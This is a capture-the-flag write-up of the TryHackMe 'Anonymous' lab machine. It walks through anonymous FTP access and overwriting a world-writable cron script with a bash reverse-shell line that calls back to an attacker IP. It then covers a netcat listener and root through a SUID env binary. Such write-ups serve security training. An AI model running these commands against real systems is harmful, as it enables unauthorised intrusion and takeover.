# 🧠 Machine Name: Anonymous

## 📌 Overview

- **Platform:** TryHackMe
- **Difficulty:** Medium
- **OS:** Linux

---

## 🎯 Objective

Root the machine and capture the flags.

---

## 🔍 Reconnaissance

### 🔹 Nmap Scan

```bash
nmap -sC -sV -oN nmap.txt 10.10.x.x
```

**Results:**

- **21/tcp**: open ftp (vsftpd 3.0.3)
- **22/tcp**: open ssh (OpenSSH 7.6p1)
- **139/tcp**: open netbios-ssn (Samba)
- **445/tcp**: open microsoft-ds (Samba)

---

## 🌐 Enumeration

### 🔹 FTP Enumeration

The FTP service allows **anonymous login**.

```bash
ftp 10.10.x.x
# Name: anonymous
# Password: (blank)
```

Inside the FTP server, I found a directory called `scripts/` containing three files:
- `clean.sh`
- `removed_files.log`
- `to_log.sh`

![](./ftp_files.png)

👉 `to_log.sh` seems to be a script that runs periodically to log something. If I can overwrite it, I might get access.

### 🔹 SMB Enumeration

Checking SMB shares:
```bash
smbclient -L //10.10.x.x
```

I found a share named `pics`, but it was just some dog photos. Nothing useful.

---

## 🚨 Initial Access

### 🔹 Exploiting the FTP Cronjob

I noticed that `to_log.sh` is writable by anyone.

```bash
ls -la to_log.sh
# -rwxrwxrwx    1 ftp      ftp           157 May 17  2020 to_log.sh
```

I'll upload a modified version of `to_log.sh` with a reverse shell payload:

```bash
# Locally
echo "bash -i >& /dev/tcp/10.10.14.2/4444 0>&1" > to_log.sh

# Upload via FTP
put to_log.sh
```

![](./ftp_overwrite.png)

Now I wait for the cronjob to execute it.

```bash
nc -lvnp 4444
```

👉 **Shell Received!** I am logged in as the `namelessone` user.

---

## 🧍‍♂️ Privilege Escalation

### 🔹 SUID Enumeration

Checking for SUID binaries:
```bash
find / -perm -u=s -type f 2>/dev/null
```

I found `/usr/bin/env` with SUID set.

![](./suid_env.png)

👉 **GTFOBins** time!

### 🔹 Exploiting SUID env

If `env` has SUID, I can use it to run a shell bypass:
```bash
/usr/bin/env /bin/sh -p
```

![](./root_access.png)

👉 **Root!** 

---

## 🧪 Post-Exploitation

- Captured `user.txt` and `root.txt`.
- Stable shell attained via python pty upgrade.

---

## 🧠 Lessons Learned

- **Anonymous FTP** access is dangerous, especially if write permissions are enabled on scripts.
- **Cronjobs** running world-writable scripts are a classic path to RCE.
- **SUID binaries** like `env` or `find` are basically a free ticket to root if misconfigured.

---

## 🧰 Tools Used

- nmap
- ftp
- smbclient
- netcat
- GTFOBins

---

![](./anonymous_done.png)
